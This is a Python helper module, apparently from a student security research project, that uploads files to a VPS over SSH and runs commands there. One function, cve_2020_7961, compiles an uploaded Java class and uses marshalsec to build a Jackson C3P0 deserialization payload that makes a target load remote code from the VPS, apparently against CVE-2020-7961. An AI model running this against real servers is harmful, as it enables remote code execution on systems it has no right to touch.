import paramiko
from configvalue import * 
def send_file_vps(dir_file, file_name_on_vps): 
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(PUBLIC_IP, username= USERNAME_VPS, password=PASSWORD_VPS, allow_agent=False, look_for_keys=False)

    print("connected successfully!")
    sftp = ssh.open_sftp()
    print(sftp)
    sftp.put(dir_file,'/home/parisk/NCKH_2020/' + file_name_on_vps )
    sftp.close()
    print("copied successfully!")
    ssh.close()
    
def execute_command_vps(command): 
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(PUBLIC_IP, username= USERNAME_VPS, password=PASSWORD_VPS, allow_agent=False, look_for_keys=False)

    print("connected successfully!")
    stdin, stdout, stderr = ssh.exec_command(command)
    result = stdout.read().decode('ascii').strip('\n')
    return result
def cve_2020_7961(dir_file, file_name_on_vps): 
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(PUBLIC_IP, username= USERNAME_VPS, password=PASSWORD_VPS, allow_agent=False, look_for_keys=False)
    print("connected successfully!")
    sftp = ssh.open_sftp()
    print(sftp)
    sftp.put(dir_file,'/home/parisk/NCKH_2020/' + file_name_on_vps + ".java")
    sftp.close()
    print("copied successfully!")
    ssh.exec_command("javac /home/parisk/NCKH_2020/" + file_name_on_vps + ".java")
    stdin, stdout, stderr = ssh.exec_command("java -cp marshalsec/target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.Jackson C3P0WrapperConnPool http://" + PUBLIC_IP + ":65535/ " + file_name_on_vps)
    result = stdout.read().decode('ascii').strip('\n')
    result = result.split(",")[1].replace("]",'')
    return result